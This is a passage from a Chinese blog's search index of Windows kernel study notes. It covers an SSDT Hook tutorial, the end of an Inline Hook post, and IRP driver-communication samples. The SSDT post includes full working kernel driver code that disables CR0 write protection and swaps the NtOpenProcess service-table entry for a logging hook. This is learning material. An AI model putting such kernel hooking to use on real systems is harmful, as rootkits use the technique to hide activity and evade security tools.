DbgPrint(\"Unload Success!\\n\");} 总结尽管Inline Hook相比较SSDT Hook而言，更不容易被查出来，但是PC Hunter还是可以查到我们Inline Hook的代码。到此为止，驱动这块内容就差不多了，和Win32窗口程序一样有着固定的格式，具体功能实现还是要看自己的需求。多核同步的关键在于同步，会在句柄表之后介绍。再接下来是更为复杂的APC，估计要花好一段时间来更新了。至于内核重载，可能要延一延了，涉及到的原理和3环逆向相关的较多。计划是在更新完APC后再复习3环逆向的一些内容，内核重载就更要靠后了。最近可能会确定开新坑了，把Android逆向基础的部分更一更，2月中旬以来，已经快俩月没碰Android了，手生了，需要回味一下。 参考资料参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=63 参考文章：https://blog.csdn.net/qq_41988448/article/details/103557383 参考文档：https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"SSDT Hook","slug":"SSDT_Hook","date":"2020-04-17T01:46:37.000Z","updated":"2020-04-19T16:49:44.861Z","comments":true,"path":"2020/04/17/SSDT_Hook/","link":"","permalink":"http://cata1oc.github.io/2020/04/17/SSDT_Hook/","excerpt":"","text":"经过IRP那一章，发现如果文章篇幅过长（那篇我粘了很多结构定义的代码），网页端是无法显示出来博客内容的，只能分篇，看起来会比较麻烦，以后会尽量讲的精炼，也方便自己以后查看。虽然现在依然是4月19日，但是代码是4月17日写的，就算作是那天的博客吧。这一篇主要讲解一下SSDT Hook的手法，并实现一个简单的SSDT Hook 系统服务表&SSDT关于系统服务表和SSDT的细节可以参考这里，本篇不再赘述，仅作简要介绍。 系统服务表（SystemServiceTable）：之前在3环进0环时有讲过，因为3环调用0环函数时，需要提供一个系统服务号，就是在系统服务表里进行寻址用的。 SSDT（System Service Desciptor Table）：系统服务描述符表，是一张已经导出的包含了4张系统服务表的表。其中只有第一张系统服务表可见。 通过如下语句声明，即可获取到SSDT表的首地址 c1extern PKSYSTEM_SERVICE_TABLE KeServiceDescriptorTable; SSDT Shadow（System Service Desciptor Table Shadow）：一张未导出的表，与SSDT类似，不同的在于，SSDT Shadow两张表均可见。由于未导出，需要通过其它方式进行查找，例如内存搜索。 SSDT Hook原理Hook总的来说可以分为两类：表Hook（例如IAT Hook）和地址Hook（例如Inline Hook，下一篇会讲） 表Hook：主要是通过修改函数表中的函数，替换为自己的函数从而达到Hook的目的 地址Hook：通过修改函数内部的部分字节，从而跳转到指定地方，改变程序执行流程，从而达到Hook目的 本篇中介绍的SSDT Hook属于表Hook。SSDT Hook的原理在于，通过SSDT找对应的系统服务表，在系统服务表中找到指定的内核函数，将其替换为自己的函数，从而达到Hook的目的。 SSDT Hook思路找到系统服务表由于SSDT是导出的，声明后即可获取SSDT地址，但是内核文件并未提供SSDT及系统服务表的结构体，这里我们需要自己先定义SSDT和系统服务表的结构体，并声明SSDT，代码如下： c1234567891011121314151617//定义系统服务表结构typedef struct _KSYSTEM_SERVICE_TABLE { PULONG ServiceTableBase; //服务函数地址表基址 PULONG Count; ULONG ServiceLimit; //服务函数的个数 PULONG ArgmentTableBase; //服务函数参数表地址}KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;//定义系统服务描述符表（SSDT）结构typedef struct _KSERVICE_DESCRIPTOR_TABLE { KSYSTEM_SERVICE_TABLE ntoskrnl; //ntoskrnl.exe的服务函数 KSYSTEM_SERVICE_TABLE win32k; //win32k.sys的服务函数，(GDI32.dll/User32.dll 的内核支持) KSYSTEM_SERVICE_TABLE notUsed1; KSYSTEM_SERVICE_TABLE notUsed2;}KSERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE;extern PKSYSTEM_SERVICE_TABLE KeServiceDescriptorTable; 构建自己的函数本次实验采用对NtOpenProcess进行Hook，所以我们需要构建一个自己的MyNtOpenProcess函数。构建自己的函数有如下注意事项： 参数必须与原函数一致，否则执行时会崩溃 实现自己的功能，例如打印参数等 调用原本的函数，若不调用原本的函数，该函数将无法执行下去实现原本的功能，也会造成程序崩溃。 所以需要先定义一个函数指针，并用一个全局变量保存原函数的地址（在系统服务表中找到NtOpenProcess，该函数的系统服务号是0x7A），在自己的MyNtOpenProcess中执行完自身的功能调用原函数完成整个程序的执行。代码如下： c123456789101112131415161718192021222324252627//定义调用NtOpenProcess的函数指针typedef NTSTATUS(*NTOPENPROCESS)( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId );//定义全局变量保存原函数地址ULONG OriginFunctionAddr = (KeServiceDescriptorTable->ServiceTableBase)[0x7A];//实现自己的MyNtOpenProcess函数NTSTATUS MyNtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { //执行自己的功能，这里是打印NtOpenProcess的参数 DbgPrint(\"ProcessHandle: %x, DesiredAccess: %x, ObjectAttributes: %x, ClientId: %x\\n\", ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); NTOPENPROCESS pOpenProcess = (NTOPENPROCESS)OriginFunctionAddr; pOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); return STATUS_SUCCESS;} 修改系统服务表地址NtOpenProcess的系统服务号是0x7A，这一步看上去很简单，只需要修改系统服务表中，下标为0x7A那个函数的地址为自己MyNtOpenProcess函数的地址即可。但是有一点需要注意的是，系统服务表所对应的物理页是只读的，所以在修改前我们需要先修改物理页的属性。有如下两种方式： 通过页表基址修改物理页属性 c1234567891011121314if(RCR4 & 0x00000020){//说明是2-9-9-12分页 KdPrint((\"2-9-9-12分页 %p\\n\",RCR4)); KdPrint((\"PTE1 %p\\n\",*(DWORD*)(0xC0000000 + ((HookFunAddr >> 9) & 0x007FFFF8)))); *(DWORD64*)(0xC0000000 + ((HookFunAddr >> 9) & 0x007FFFF8)) |= 0x02; KdPrint((\"PTE1 %p\\n\",*(DWORD*)(0xC0000000 + ((HookFunAddr >> 9) & 0x007FFFF8))));}else{//说明是10-10-12分页 KdPrint((\"10-10-12分页\\n\")); KdPrint((\"PTE1 %p\\n\",*(DWORD*)(0xC0000000 + ((HookFunAddr >> 10) & 0x003FFFFC)))); *(DWORD*)(0xC0000000 + ((HookFunAddr >> 10) & 0x003FFFFC)) |= 0x02; KdPrint((\"PTE2 %p\\n\",*(DWORD*)(0xC0000000 + ((HookFunAddr >> 10) & 0x003FFFFC))));} 通过修改CR0寄存器 代码如下： Code1234567891011121314151617VOID PageProtectOff() { __asm { cli mov eax, cr0 and eax, not 0x10000 mov cr0, eax }}VOID PageProtectOn() { __asm { mov eax, cr0 or eax, 0x10000 mov cr0, eax sti }} 本次实验采用的是第二种方式，修改Cr0寄存器达成Hook的目的，代码如下： c123456VOID HookNtOpenProcess() { PageProtectOff(); (KeServiceDescriptorTable->ServiceTableBase)[0x7A] = &MyNtOpenProcess; DbgPrint(\"Hook Starting...\\n\"); PageProtectOn();} 设置Unhook函数Hook完实现自身功能，达成目的之后，需要设置一个Unhook函数，把系统服务表再改回来，所以还需要设置一个Unhook函数，这个函数就比较简单了，只需要把原函数的地址再写回去即可，需要通过先前代码设置一个全局变量保存原函数的地址。代码如下： c12345678910//设置全局变量，保存原函数的地址ULONG OriginFunctionAddr = (KeServiceDescriptorTable->ServiceTableBase)[0x7A];//Unhook函数VOID UnHookNtOpenProcess() { PageProtectOff(); (KeServiceDescriptorTable->ServiceTableBase)[0x7A] = OriginFunctionAddr; DbgPrint(\"UnHook Finished!\\n\"); PageProtectOn();·} 功能演示在执行驱动前，查看PC Hunter，可以发现SSDT并没有函数被挂钩 执行后，在DebugView中可以看到，不断有NtOpenProcess的参数被写入，说明不断有新的进程被打开，我们打开一个记事本文件，同样会增加一些参数的打印 这时，我们再次查看PC Hunter，发现PC Hunter已经被检测到了SSDT表被挂钩子了，也说明这次实验SSDT Hook成功了 完整代码附上完整代码作为参考 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include \"ntddk.h\"//定义调用NtOpenProcess的函数指针typedef NTSTATUS(*NTOPENPROCESS)( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId );//定义系统服务表结构typedef struct _KSYSTEM_SERVICE_TABLE { PULONG ServiceTableBase; //服务函数地址表基址 PULONG Count; ULONG ServiceLimit; //服务函数的个数 PULONG ArgmentTableBase; //服务函数参数表地址}KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE;//定义系统服务描述符表（SSDT）结构typedef struct _KSERVICE_DESCRIPTOR_TABLE { KSYSTEM_SERVICE_TABLE ntoskrnl; //ntoskrnl.exe的服务函数 KSYSTEM_SERVICE_TABLE win32k; //win32k.sys的服务函数，(GDI32.dll/User32.dll 的内核支持) KSYSTEM_SERVICE_TABLE notUsed1; KSYSTEM_SERVICE_TABLE notUsed2;}KSERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE;extern PKSYSTEM_SERVICE_TABLE KeServiceDescriptorTable;//函数声明NTSTATUS MyNtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);VOID HookNtOpenProcess();VOID UnHookNtOpenProcess();VOID PageProtectOff();VOID PageProtectOn();VOID Driver_Unload(PDRIVER_OBJECT pDriverObj);//定义原函数为全局变量ULONG OriginFunctionAddr;NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) { DbgPrint(\"Driver is running!\\n\"); OriginFunctionAddr = (KeServiceDescriptorTable->ServiceTableBase)[0x7A]; /* DbgPrint(\"%x, %x, %x, %x\\n\", KeServiceDescriptorTable->ServiceTableBase, KeServiceDescriptorTable->Count, KeServiceDescriptorTable->ServiceLimit, KeServiceDescriptorTable->ArgmentTableBase); */ // DbgPrint(\"OriginFunctionAddr: %x\", OriginFunctionAddr); HookNtOpenProcess(); pDriverObj->DriverUnload = Driver_Unload; return STATUS_SUCCESS;}NTSTATUS MyNtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { DbgPrint(\"ProcessHandle: %x, DesiredAccess: %x, ObjectAttributes: %x, ClientId: %x\\n\", ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); NTOPENPROCESS pOpenProcess = (NTOPENPROCESS)OriginFunctionAddr; pOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); return STATUS_SUCCESS;}VOID HookNtOpenProcess() { PageProtectOff(); (KeServiceDescriptorTable->ServiceTableBase)[0x7A] = &MyNtOpenProcess; DbgPrint(\"Hook Starting...\\n\"); PageProtectOn();}VOID UnHookNtOpenProcess() { PageProtectOff(); (KeServiceDescriptorTable->ServiceTableBase)[0x7A] = OriginFunctionAddr; DbgPrint(\"UnHook Finished!\\n\"); PageProtectOn();}VOID PageProtectOff() { __asm { cli mov eax, cr0 and eax, not 0x10000 mov cr0, eax }}VOID PageProtectOn() { __asm { mov eax, cr0 or eax, 0x10000 mov cr0, eax sti }}VOID Driver_Unload(PDRIVER_OBJECT pDriverObj) { UnHookNtOpenProcess(); DbgPrint(\"Unload Success!\\n\");} 总结通过PC Hunter我们可以发现，SSDT Hook是很容易被检测出来的，也就容易有反制措施，下一篇会介绍另一种Hook的方式：Inline Hook来达成同样的功能或者目的。 参考资料参考教程：https://www.bilibili.com/video/BV1NJ411M7aE?p=62 参考文章：https://blog.csdn.net/qq_41988448/article/details/103527830 参考笔记：馍馍的笔记","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"初探IRP（代码&程序演示）","slug":"IRP代码部分","date":"2020-04-14T15:58:28.000Z","updated":"2020-04-19T08:43:48.943Z","comments":true,"path":"2020/04/14/IRP代码部分/","link":"","permalink":"http://cata1oc.github.io/2020/04/14/IRP%E4%BB%A3%E7%A0%81%E9%83%A8%E5%88%86/","excerpt":"","text":"由于篇幅太长了，一篇没法装下，所以程序的完整代码和程序演示放到这篇来。程序演示部分需要结合前一篇文章一起看。这里不再赘述具体过程。 完整代码Ring3部分c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include \"stdafx.h\"#include \"Windows.h\"#include \"winioctl.h\"#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)#define SYM_LINK_NAME L\"\\\\\\\\.\\\\MyRing3Device\"int main(int argc, char* argv[]){ //Call IRP_MJ_CREATE getchar(); HANDLE hDevice = CreateFileW( SYM_LINK_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hDevice == INVALID_HANDLE_VALUE){ printf(\"Create File Failed!\"); getchar(); return -1; } else { printf(\"Create File Success!\"); } //Call IRP_MY_DEVICE_CONTROL getchar(); char pInputBuffer[20] = {1, 2, 4, 8, 16, 32, 64, 0}; char pOutputBuffer[20] = {0}; DWORD dwReturnSize = 0; BOOL bDIC = DeviceIoControl(hDevice, OPCODE2, pInputBuffer, 8, pOutputBuffer, 20, &dwReturnSize, NULL); if(bDIC != 0){ printf(\"ReturnSize: %x\\n\", dwReturnSize); printf(\"OutputBuffer: \"); for(int i = 0; i < dwReturnSize; i++){ printf(\"%x \", pOutputBuffer[i]); } } else { printf(\"Communicate Failed!\\n\"); return -1; } printf(\"\\nRing3 And Ring0 Communicate Success!\\n\"); //Call IRP_MJ_CLOSE getchar(); BOOL bCH = CloseHandle(hDevice); if(bCH != 0){ printf(\"Close File Success!\"); } getchar(); return 0;} Ring0部分c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#include \"ntifs.h\"#define DEVICE_NAME L\"\\\\Device\\\\MyDevice\"#define SYM_LINK_NAME L\"\\\\??\\\\MyRing3Device\"#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj);NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);//Driver Entry NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) { DbgPrint(\"Driver is running!\\n\"); PDEVICE_OBJECT pDeviceObj = NULL; NTSTATUS status = 0; //Create Deivce Object UNICODE_STRING DeviceName; RtlInitUnicodeString(&DeviceName, DEVICE_NAME); status = IoCreateDevice(pDriverObj, 0, &DeviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDeviceObj); if (status != STATUS_SUCCESS) { DbgPrint(\"Device Create Failed!\\n\"); return status; } else { DbgPrint(\"Device Create Success!\\n\"); } //Set Communicate Ways //注意这里一定要用\"|=\", 而不能直接用\"=\",因为在创建Device时会给Fllags赋上一个初值 pDeviceObj->Flags |= DO_BUFFERED_IO; //Create Symbollic Link UNICODE_STRING SymbolicLinkName; RtlInitUnicodeString(&SymbolicLinkName, SYM_LINK_NAME); IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName); //Set Dispatch Function pDriverObj->MajorFunction[IRP_MJ_CREATE] = IrpCreateProc; pDriverObj->MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc; pDriverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc; //Set Unload Function pDriverObj->DriverUnload = Drvier_Unload; return STATUS_SUCCESS;}NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) { DbgPrint(\"Irp Create Dispatch Function...\\n\"); pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;}NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) { DbgPrint(\"Irp Close Dispatch Function...\\n\"); pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 0; IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;}NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) { DbgPrint(\"Irp DeviceControl Dispatch Function...\\n\"); //获取缓冲区数据 PVOID pSystemBuffer = pIrp->AssociatedIrp.SystemBuffer; //获取IO_STACK_LOCATION PIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp); ULONG InputBufferLength = pStackLocation->Parameters.DeviceIoControl.InputBufferLength; ULONG FsControlCode = pStackLocation->Parameters.DeviceIoControl.IoControlCode; //判断操作码 switch (FsControlCode) { case OPCODE1: DbgPrint(\"不打印操作码\"); pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 2; break; case OPCODE2: DbgPrint(\"操作码：%x\\n\", FsControlCode); for (UINT32 i = 0; i < InputBufferLength; i++) { DbgPrint(\"Ring3 Data: %x\\n\", ((PUCHAR)pSystemBuffer)[i]); } pIrp->IoStatus.Status = STATUS_SUCCESS; pIrp->IoStatus.Information = 5; break; } IoCompleteRequest(pIrp, IO_NO_INCREMENT); return STATUS_SUCCESS;}VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj) { //Delete SymbolicLink UNICODE_STRING SymbolicLinkName; RtlInitUnicodeString(&SymbolicLinkName, SYM_LINK_NAME); IoDeleteSymbolicLink(&SymbolicLinkName); //Delete Deivce IoDeleteDevice(pDriverObj->DeviceObject); DbgPrint(\"Unload Success!\\n\");} 程序演示操作码1 操作码2","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"初探IRP（原理&程序思路）","slug":"初探IRP","date":"2020-04-14T15:43:42.000Z","updated":"2020-04-19T08:43:01.175Z","comments":true,"path":"2020/04/14/初探IRP/","link":"","permalink":"http://cata1oc.github.io/2020/04/14/%E5%88%9D%E6%8E%A2IRP/","excerpt":"","text":"通过前一篇文章的学习了解到IRP是Windows系统中用于表达一个I/O请求的核心数据结构，当内核模式代码要发起一个I/O请求时，它会构造一个IRP，用于在处理该I/O请求的过程中代表该请求。 IRP结构IRP对象从一个I/O请求被发起时开始存在，一直到该I/O请求被完成或者取消为止，在此过程中，会有多方操纵此IRP对象，包括I/O管理器、即插即用管理器、电源管理器以及一个或多个驱动程序等。Windows I/O系统本质上支持异步I/O请求，所以，IRP对象必须携带足够多的环境信息，以便能够描述一个I/O请求的所有状态。下面来研究一下IRP这个结构。 看上去结构并不复杂，但其中有很多字段包含了结构体，结构体内又内嵌了结构体和联合体，下面结合官方文档中结构的定义来分析（写入到注释中） c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859typedef struct _IRP { CSHORT Type; //IRP类型，等于IO_TYPE_IRP宏 USHORT Size; //IRP大小 PMDL MdlAddress; //该I/O请求的用户缓冲区的MDL，仅用于“直接I/O”类型 ULONG Flags; //用于记录各种标志 union { struct _IRP *MasterIrp; //若这是一个关联IRP，则指向主IRP __volatile LONG IrpCount; //若这是一个主IRP，则必须先完成多少个关联IRP PVOID SystemBuffer; //该操作被缓冲起来，指向系统地址空间缓冲区的地址 } AssociatedIrp; LIST_ENTRY ThreadListEntry; //链表项，可以加入到线程的未完成I/O请求链表中 IO_STATUS_BLOCK IoStatus; //I/O操作的状态 KPROCESSOR_MODE RequestorMode; //内核模式I/O请求或用户模式I/O请求 BOOLEAN PendingReturned; //未完成返回 CHAR StackCount; //栈单元（IO_STACK_LOCATION）计数 CHAR CurrentLocation; //当前栈单元位置 BOOLEAN Cancel; //该I/O请求是否已被取消 KIRQL CancelIrql; //取消自旋锁在哪级IRQL上被获取 CCHAR ApcEnvironment; //用于当该IRP被初始化时保存APC环境 UCHAR AllocationFlags; //该IRP内存的分配控制标志 PIO_STATUS_BLOCK UserIosb; //用户的I/O状态块 PKEVENT UserEvent; //用户事件对象 union { struct { union { PIO_APC_ROUTINE UserApcRoutine; //当I/O请求完成时执行的APC例程 PVOID IssuingProcess; }; PVOID UserApcContext; //传递给UserApcRoutine的环境参数 } AsynchronousParameters; LARGE_INTEGER AllocationSize; //分配块的大小 } Overlay; __volatile PDRIVER_CANCEL CancelRoutine; //若是可取消的I/O请求，该域包含了取消时调用的例程 PVOID UserBuffer; //调用者（即发起者，往往是3环程序）提供的输出缓冲区地址 //以下Tail联合成员用于当I/O管理器处理该I/O请求时存放各种工作信息 union { struct { union { KDEVICE_QUEUE_ENTRY DeviceQueueEntry; //设备队列项 struct { PVOID DriverContext[4]; //由驱动程序解释和使用 }; }; PETHREAD Thread; //指向发起者线程的EHTREAD PCHAR AuxiliaryBuffer; //辅助缓冲区 struct { LIST_ENTRY ListEntry; //存放到完成队列中的链表项 union { struct _IO_STACK_LOCATION *CurrentStackLocation; //指向当前栈单元，驱动程序不可直接访问 ULONG PacketType; //Minipacket的类型 }; }; PFILE_OBJECT OriginalFileObject; //指向原始的文件对象 } Overlay; KAPC Apc; //特殊内核模式APC或发起者的APC PVOID CompletionKey; //完成键，用于标识在不同文件句柄上的I/O请求 } Tail;} IRP; 根据注释，可以大致了解IRP结构各个字段的含义及作用，这里主要介绍几个接下来会用到的： AssociatedIrp.SystemBuffer：根据定义，可以发现它是一个指向系统地址空间缓冲区的指针。这个系统地址空间缓冲区又是什么？在前一篇中，我们曾介绍过，在创建完设备对象后，需要设置设备对象的Flags字段，也就是设置数据传输方式。而这个SystemBuffer字段，就是在采用缓冲区方式读写（DO_BUFFERED_IO）时，指向的内核空间中分配的一块用于数据复制、交换的内存 MdlAddress：和SystemBuffer类似，这个字段也是在通过缓冲区处理I/O请求时，与设置的数据传输方式有关，这个字段在设备对象采用直接方式读写（DO_DIRECT_IO）时有效。当使用这种方式进行数据读写时，I/O请求的发起者调用IoAllocateMdl函数申请一个MDL（Memory Descriptor List，内存描述符链表），将调用者指定的缓冲区的物理页面构成一个MDL，以便于设备驱动程序使用DMA方式来传输数据。这个字段就是记录了一个I/O请求所使用的MDL。 UserBuffer：同上。当设备对象采用的是默认方式读写（NEITHER_IO）时，就会使用这个字段。此时I/O管理器或者I/O请求的发起者不负责缓冲区管理工作，而由驱动程序自行决定该如何使用缓冲区。其中输出缓冲区的指针放在该字段内，缓冲区本身不做任何处理。 IoStatus：I/O操作的状态。这个字段是一个_IO_STATUS_BLOCK结构体 c123456789typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information;} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK; 1）Status：表示IRP的完成状态，如果三环程序调用完后发生了错误，想通过GetLastError函数来获取错误码，实际上获取到的就是这个Status的值，也就是说，我们自己在驱动中编写特定IRP对应的派遣函数的话，是可以设置它的错误码的。 2）Information：这个数，决定了返回给3环多少数据。某些3环函数，会传入一部分数据进来（IN类型的参数），也会接收一部分数据（OUT类型的参数）。例如，3环传进来一个CHAR数组，有8个元素，但是我们在该函数的派遣函数中设置的Information的值是2，最后这个数组返回到3环时，就只有2个元素了。具体可以参考后面的程序演示部分。 栈单元实际上，IRP数据结构仅仅是一个I/O请求的固定描述部分，另一部分是一个或者多个栈单元。每个栈单元针对单个驱动程序，I/O管理器在处理一个I/O请求时，根据目标设备对象(DeviceObject)的StackSize 域，可以知道最多有多少个驱动程序需要参与到该I/O请求的处理过程中。下面来看一下栈单元这个结构： 看上去，这个结构并不复杂，但实际上要注意一下Parameters这个域，这是一个联合体，包含了不同IRP对应的3环函数原型所需的参数，一起来看一下： c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206union { struct { PIO_SECURITY_CONTEXT SecurityContext; ULONG Options; USHORT POINTER_ALIGNMENT FileAttributes; USHORT ShareAccess; ULONG POINTER_ALIGNMENT EaLength; } Create; struct { PIO_SECURITY_CONTEXT SecurityContext; ULONG Options; USHORT POINTER_ALIGNMENT Reserved; USHORT ShareAccess; PNAMED_PIPE_CREATE_PARAMETERS Parameters; } CreatePipe; struct { PIO_SECURITY_CONTEXT SecurityContext; ULONG Options; USHORT POINTER_ALIGNMENT Reserved; USHORT ShareAccess; PMAILSLOT_CREATE_PARAMETERS Parameters; } CreateMailslot; struct { ULONG Length; ULONG POINTER_ALIGNMENT Key; ULONG Flags; LARGE_INTEGER ByteOffset; } Read; struct { ULONG Length; ULONG POINTER_ALIGNMENT Key; ULONG Flags; LARGE_INTEGER ByteOffset; } Write; struct { ULONG Length; PUNICODE_STRING FileName; FILE_INFORMATION_CLASS FileInformationClass; ULONG POINTER_ALIGNMENT FileIndex; } QueryDirectory; struct { ULONG Length; ULONG POINTER_ALIGNMENT CompletionFilter; } NotifyDirectory; struct { ULONG Length; ULONG POINTER_ALIGNMENT CompletionFilter; DIRECTORY_NOTIFY_INFORMATION_CLASS POINTER_ALIGNMENT DirectoryNotifyInformationClass; } NotifyDirectoryEx; struct { ULONG Length; FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass; } QueryFile; struct { ULONG Length; FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass; PFILE_OBJECT FileObject; union { struct { BOOLEAN ReplaceIfExists; BOOLEAN AdvanceOnly; }; ULONG ClusterCount; HANDLE DeleteHandle; }; } SetFile; struct { ULONG Length; PVOID EaList; ULONG EaListLength; ULONG POINTER_ALIGNMENT EaIndex; } QueryEa; struct { ULONG Length; } SetEa; struct { ULONG Length; FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass; } QueryVolume; struct { ULONG Length; FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass; } SetVolume; struct { ULONG OutputBufferLength; ULONG POINTER_ALIGNMENT InputBufferLength; ULONG POINTER_ALIGNMENT FsControlCode; PVOID Type3InputBuffer; } FileSystemControl; struct { PLARGE_INTEGER Length; ULONG POINTER_ALIGNMENT Key; LARGE_INTEGER ByteOffset; } LockControl; struct { ULONG OutputBufferLength; ULONG POINTER_ALIGNMENT InputBufferLength; ULONG POINTER_ALIGNMENT IoControlCode; PVOID Type3InputBuffer; } DeviceIoControl; struct { SECURITY_INFORMATION SecurityInformation; ULONG POINTER_ALIGNMENT Length; } QuerySecurity; struct { SECURITY_INFORMATION SecurityInformation; PSECURITY_DESCRIPTOR SecurityDescriptor; } SetSecurity; struct { PVPB Vpb; PDEVICE_OBJECT DeviceObject; } MountVolume; struct { PVPB Vpb; PDEVICE_OBJECT DeviceObject; } VerifyVolume; struct { struct _SCSI_REQUEST_BLOCK *Srb; } Scsi; struct { ULONG Length; PSID StartSid; PFILE_GET_QUOTA_INFORMATION SidList; ULONG SidListLength; } QueryQuota; struct { ULONG Length; } SetQuota; struct { DEVICE_RELATION_TYPE Type; } QueryDeviceRelations; struct { const GUID *InterfaceType; USHORT Size; USHORT Version; PINTERFACE Interface; PVOID InterfaceSpecificData; } QueryInterface; struct { PDEVICE_CAPABILITIES Capabilities; } DeviceCapabilities; struct { PIO_RESOURCE_REQUIREMENTS_LIST IoResourceRequirementList; } FilterResourceRequirements; struct { ULONG WhichSpace; PVOID Buffer; ULONG Offset; ULONG POINTER_ALIGNMENT Length; } ReadWriteConfig; struct { BOOLEAN Lock; } SetLock; struct { BUS_QUERY_ID_TYPE IdType; } QueryId; struct { DEVICE_TEXT_TYPE DeviceTextType; LCID POINTER_ALIGNMENT LocaleId; } QueryDeviceText; struct { BOOLEAN InPath; BOOLEAN Reserved[3]; DEVICE_USAGE_NOTIFICATION_TYPE POINTER_ALIGNMENT Type; } UsageNotification; struct { SYSTEM_POWER_STATE PowerState; } WaitWake; struct { PPOWER_SEQUENCE PowerSequence; } PowerSequence;#if ... struct { union { ULONG SystemContext; SYSTEM_POWER_STATE_CONTEXT SystemPowerStateContext; }; POWER_STATE_TYPE POINTER_ALIGNMENT Type; POWER_STATE POINTER_ALIGNMENT State; POWER_ACTION POINTER_ALIGNMENT ShutdownType; } Power;#else struct { ULONG SystemContext; POWER_STATE_TYPE POINTER_ALIGNMENT Type; POWER_STATE POINTER_ALIGNMENT State; POWER_ACTION POINTER_ALIGNMENT ShutdownType; } Power;#endif struct { PCM_RESOURCE_LIST AllocatedResources; PCM_RESOURCE_LIST AllocatedResourcesTranslated; } StartDevice; struct { ULONG_PTR ProviderId; PVOID DataPath; ULONG BufferSize; PVOID Buffer; } WMI; struct { PVOID Argument1; PVOID Argument2; PVOID Argument3; PVOID Argument4; } Others; } Parameters; 